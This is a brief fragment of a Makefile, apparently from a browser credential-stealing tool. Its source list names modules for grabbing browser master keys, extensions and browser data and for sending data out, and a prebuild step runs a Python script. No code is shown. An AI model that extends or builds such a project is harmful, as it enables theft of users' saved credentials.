...
CSRC = src/main.c src/decoding.c src/MasterKeyGrabber.c src/ExtensionsGrabber.c src/SendData.c src/DllOps.c src/FileIO.c src/MemoryUtils.c src/BrowserGrabber.c src/hashing.c src/StringUtils.c src/DirectoryOps.c src/AddrResolution.c src/PathOps.c
...
prebuild:
	...
	@ python3 build-tools/prebuild.py
